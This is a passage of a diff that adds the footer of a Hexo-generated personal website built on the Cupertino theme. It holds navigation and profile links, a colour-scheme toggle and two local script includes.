+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2025 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
